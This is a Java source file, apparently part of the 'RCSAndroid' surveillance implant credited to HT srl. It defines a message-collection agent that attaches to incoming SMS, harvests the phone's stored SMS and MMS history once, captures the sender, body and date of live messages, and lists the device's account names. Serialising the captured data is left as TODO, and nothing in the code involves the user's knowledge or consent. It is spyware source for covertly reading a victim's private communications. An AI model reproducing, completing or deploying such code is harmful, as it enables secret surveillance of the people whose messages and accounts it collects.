/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : MessageAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.agent;

import java.util.ArrayList;
import java.util.Iterator;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.util.Log;

import com.ht.RCSAndroidGUI.Mms;
import com.ht.RCSAndroidGUI.Sms;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.event.EventType;
import com.ht.RCSAndroidGUI.evidence.Markup;
import com.ht.RCSAndroidGUI.interfaces.Observer;
import com.ht.RCSAndroidGUI.listener.ListenerSms;
import com.ht.RCSAndroidGUI.util.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class MessageAgent.
 *
 * @author zeno -> Ahahah ti piacerebbe eh?? :>
 * @real-author Que, r0x
 */
public class AgentMessage extends AgentBase implements Observer<Sms> {
	/** The TAG. */
	private final String TAG = "AgentMessage";

	@Override
	public void begin() {
		ListenerSms.self().attach(this);
		
		Markup storedImsi = new Markup(AgentType.AGENT_SMS);
		
		// Abbiamo gia' catturato lo storico
		if (storedImsi.isMarkup() == true)
			return;
		
		SmsBrowser smsBrowser = new SmsBrowser();
		ArrayList<Sms> listSms = smsBrowser.getSmsList();
		Iterator<Sms> iterSms = listSms.listIterator();
		
		while (iterSms.hasNext()) {
			Sms element = iterSms.next();
			// TODO
			// Serializzare qui
		}
		
		MmsBrowser mmsBrowser = new MmsBrowser();
		ArrayList<Mms> listMms = mmsBrowser.getMmsList();
		Iterator<Mms> iterMms = listMms.listIterator();
		
		while (iterMms.hasNext()) {
			Mms element = iterMms.next();
			element.print();
			// TODO
			// Serializzare qui
		}
		
		// Scriviamo il markup
		storedImsi.writeMarkup(Utils.longToByteArray(System.currentTimeMillis()));
	}

	@Override
	public void end() {
		ListenerSms.self().detach(this);
	}

	@Override
	public boolean parse(AgentConf conf) {
		setPeriod(NEVER);
		setDelay(100);
		
		return true;
	}

	@Override
	public void go() {

	}

	public int notification(Sms s) {
		// Live SMS
		String address = s.getAddress();
		String body = s.getBody();
		long date = s.getDate();
		
		// Serializzare qui
		return 1;
	}
	
	// SNIPPET
	/**
	 * Check email accounts.
	 */
	private void checkEmailAccounts() {
		final Account[] accounts = AccountManager.get(Status.getAppContext())
				.getAccounts();
		
		for (final Account account : accounts) {

			final String name = account.name;
			Log.d("QZ", TAG + name);
		}
	}
}
